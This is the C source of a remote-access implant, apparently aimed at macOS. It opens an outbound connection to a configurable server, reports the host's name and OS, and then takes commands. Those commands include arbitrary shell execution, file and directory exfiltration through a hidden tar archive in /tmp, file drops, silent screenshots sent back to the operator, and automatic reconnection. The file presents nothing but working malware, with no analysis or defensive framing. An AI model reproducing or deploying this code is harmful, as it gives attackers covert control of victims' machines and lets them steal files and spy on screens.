#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include <libtar.h>

#include "helpers.h"


#define STR(s) #s
#define VALUE(s) STR(s)

#ifndef IP
#define SERVER_IP "127.0.0.1"
#else
#define SERVER_IP VALUE(IP)
#endif

#ifndef PORT
#define SERVER_PORT 50004
#else
#define SERVER_PORT VALUE(PORT)
#endif

#ifndef OUTPUT_SIZE
#define OUTPUT_SIZE 8192
#endif

#ifndef CHUNKSIZE
#define CHUNKSIZE 2048
#endif

#ifndef CWD
#define CWD /
#endif

#define TMPDIR "/tmp/.store"


#ifdef DEBUG
#define D(msg) printf("\nDEBUG: " #msg);
#define C(code) code
#else
#define D(msg)
#define C(code) 
#endif
 



int socket_desc;
struct sockaddr_in server;
int sigpipe_received = 0;

void socket_create();
int socket_connect();

void register_signal_handler();
static void quit_gracefully(int signo);
static void sigpipe_catch(int signo);


void shell();
int upload(const char* filename);
int download(const char* filename);


int main(int argc, char** argv) {
	

	chdir(STR(CWD));

	setbuf(stdout, NULL);
	
	register_signal_handler();
	
	socket_create();
	socket_connect();
	
	shell();

	return 0;
}


void register_signal_handler() {
	signal(SIGINT, quit_gracefully);
	signal(SIGPIPE, sigpipe_catch);
	signal(SIGTERM, quit_gracefully);
}

static void sigpipe_catch(int signo) {
		
	sleep(1);
	sigpipe_received = 1;
	socket_create();
	socket_connect();
	sigpipe_received = 0;
	shell();
}

static void quit_gracefully(int signo) {
	close(socket_desc);
	exit(0);
}

void socket_create() {
	

	socket_desc = socket(AF_INET, SOCK_STREAM, 0);

	if (socket_desc == -1) {
		sleep(2);
		socket_create();
	}
	return;
}

int socket_connect() {
	
	server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    int success = connect(socket_desc , (struct sockaddr*)&server , sizeof(server));

    char hostname[40];
	size_t len = sizeof(char) * 40;
	struct utsname buf;

	gethostname(hostname, len);
	uname(&buf);

	if (strlen(hostname) == 0) {
		strcpy(hostname, "unknown");
	} 
	if (strlen(buf.sysname) == 0) {
		strcpy(buf.sysname, "unknown");
	}

	char* info;

	int str_len = strlen(hostname) + strlen("___") + strlen(buf.sysname) + 1;
	info = (char*) malloc(sizeof(char) * str_len);
	strcpy(info, hostname);
	info = strcat(info, "___");
	info = strcat(info, buf.sysname);
	
	if (send(socket_desc, info, strlen(info), 0) < 0) {}
	
	free(info);
	return success;


    
}



int upload(const char* from) {

	char buffer[CHUNKSIZE];
	bool confirmation = false;
	
	
	FILE* fp = NULL;
	struct stat st;
	int b = CHUNKSIZE;
	uint64_t left;
	
	stat(from, &st);

	bool isdir = S_ISDIR(st.st_mode);

	
	if (isdir) {
	
		if (send(socket_desc, "\x10", 1, 0) < 0) return 0;

		TAR* t = NULL;
		char** fmts;
		int n = split(from, "/", &fmts, false);
		
		if (tar_open(&t, TMPDIR, NULL, O_WRONLY | O_CREAT, 0644, TAR_GNU) == -1) return 0;
		if (tar_append_tree(t, (char*) from, fmts[n-1]) != 0) {
			tar_close(t);
			return 0;
		}
		if (tar_append_eof(t) != 0) {
			tar_close(t);
			return 0;
		}
		if (tar_close(t) != 0) return 0;

		fp = fopen(TMPDIR, "rb");

		fstat(fileno(fp), &st);
		left = st.st_size;

		for (int i = 0; i < n; i++) free(fmts[i]);
		free(fmts);
	} else {

		if (send(socket_desc, "\x11", 1, 0) < 0) return 0;
		fp = fopen(from, "rb");
		left = st.st_size;
	}
	 
	fseek(fp, 0, SEEK_SET);
	

	uint64_t converted = htonl(left);
	if(send(socket_desc, &converted, sizeof(converted), 0) < 0) return 0;

	while(1) {
		if (left < CHUNKSIZE) b = left;

		fread(buffer, sizeof(char), b, fp);

		if (send(socket_desc, buffer, b, 0) < 0) return 0;
		

		left -= b;

		memset(&buffer, 0, sizeof(buffer));
		
		// client side sync
		if (recv(socket_desc, &confirmation, sizeof(bool), 0) < 0) return 0;

		if (left == 0) break;
	}

	fclose(fp);

	if (isdir) {
		remove(TMPDIR);
	}

	return 1;
}

int download(const char* to) {
	char isdir = 0;
	char buffer[CHUNKSIZE];
	FILE* fp = NULL;
	uint64_t flen = 0;
	int b = CHUNKSIZE;

	
	if(recv(socket_desc, &isdir, 1, 0) < 0) return 0;

	if (isdir == 16) {
		fp = fopen(TMPDIR, "wb");
	} else if (isdir == 17) {
		fp = fopen(to, "wb");
	}

	if(recv(socket_desc, &flen, sizeof(flen), 0) < 0) return 0;

	uint64_t left = flen;

	

	while(1) {
		if (left < CHUNKSIZE) b = left;

		if (recv(socket_desc, &buffer, b, 0) < 0) return 0;
		

		fwrite(buffer, sizeof(char), b, fp);

		memset(&buffer, 0, sizeof(buffer));

		left -= b;

		// client side confirmation
		if (send(socket_desc, "\x01", 1, 0) < 0) return 0;
		

		if (left == 0) break;
		

	}

	fclose(fp);

	if (isdir == 16) {
		TAR* t = NULL;

		if (tar_open(&t, TMPDIR, NULL, O_RDONLY, 0, TAR_GNU) == -1) return 0;
		if (tar_extract_all(t, ".") != 0) {
			tar_close(t);
			return 0;
		}
		if (tar_close(t) != 0) return 0;

		remove(TMPDIR);
	}


	return 1;
}

void shell() {
	char* req = NULL;
	char output[OUTPUT_SIZE];
	bool message;
	
	while(1) {
		message = true;
		if (sigpipe_received) break;

		req = (char*) malloc(sizeof(char) * (OUTPUT_SIZE/2));
		
		memset(output, 0, OUTPUT_SIZE);
		memset(req, 0, OUTPUT_SIZE/2);
		
		if (recv(socket_desc, req, OUTPUT_SIZE/2, 0) < 0) {
			
			sigpipe_received = 1;
			free(req);
			raise(SIGPIPE);
			continue;
		}
		

		strncpy(output, "\n\0", OUTPUT_SIZE);

		if (startcmp(req, "cd")) {
			
			char* dir = (char*) replace("cd " , "", req);

			
			if (chdir(dir) < 0) {
				strncpy(output, "Error while changing directory\n\0", OUTPUT_SIZE);
			} else {
				char* ret = (char*) malloc(sizeof(char) * 500);
				getcwd(ret, 500);
				ret = strcat(ret, "\n");
				strncpy(output, ret, OUTPUT_SIZE);

				free(ret);
			}
			free(dir);
		}
		
		else if (strcmp(req, "cwd") == 0) {
			char* ret = (char*) malloc(sizeof(char) * 500);
			getcwd(ret, 500);
			ret = strcat(ret, "\n");
			strncpy(output, ret, OUTPUT_SIZE);

			free(ret);
		}
		
		else if (strcmp(req, "screenshot") == 0) {
			message = false;
			const char* filename = "/tmp/4ableodkf.png";

			char* cmd;
			int len = strlen("/usr/sbin/screencapture -x ") + strlen(filename) + 1;

			cmd = (char*) malloc(sizeof(char) * len);



			sprintf(cmd, "/usr/sbin/screencapture -x %s", filename);

			system(cmd);
			
			free(cmd);

			if (! upload(filename)) {}
			

			remove(filename);
		}
		else if (startcmp(req, "upload")) {
			char** elements;
			int length = split(req, " ", &elements, true);

			if (length != 3) {
				strncpy(output, "Wrong call to upload. Type help for usage instruction.\n\0", OUTPUT_SIZE);

			} else {
				if (! download(elements[2])) {
					strncpy(output, "Error while uploading.\n", OUTPUT_SIZE);
				} else {
					char* success = (char*) malloc(sizeof(char) * 600);
					sprintf(success, "File %s was successfully uploaded to %s.\n", elements[1], elements[2]);
					strncpy(output, success, OUTPUT_SIZE);
					free(success);
				}
			}
			for (int i = 0; i < length; i++) free(elements[i]);
			free(elements);
		}
		else if (startcmp(req, "download")) {
			message = false;
			char* filename = (char*) replace("download ", "", req); // TD: destination
			if (! upload(filename)) {
	
				strncpy(output, "Error while downloading\n\0", OUTPUT_SIZE);
			} 
			free(filename);
		} 
		else if (strcmp(req, "quit") == 0 || strcmp(req, "q") == 0) {
			free(req);
			quit_gracefully(0);
			return;
		}
		else if (strlen(req) > 0) {
			char* cmd = strcat(req, " 2>&1");
			char line[1024];
			char* out = (char*) malloc(sizeof(char) * OUTPUT_SIZE);
			int j = 0;
			FILE* p = popen(cmd, "r");
			if (p == NULL) {
				strncpy(output, "Error while executing command.\n\0", OUTPUT_SIZE);
			} else while(fgets(line, sizeof(line), p) != NULL) {
				if (j == 0) {
					strncpy(out, line, OUTPUT_SIZE);
					j = 1;
				} else {
					out = strcat(out, line);
				}
				
			}

			strncpy(output, out, OUTPUT_SIZE);

			pclose(p);

			free(out);
		}

		
		if (strlen(output) == 0) {
			
			memset(output, 0, OUTPUT_SIZE);
			strncpy(output, "\n\0", OUTPUT_SIZE);
			
		}	

		free(req);
		if (message) {
			if (send(socket_desc, output, strlen(output), 0) < 0) {

				sigpipe_received = 1;
				raise(SIGPIPE);
			}
		}
		
		continue;
	}
}



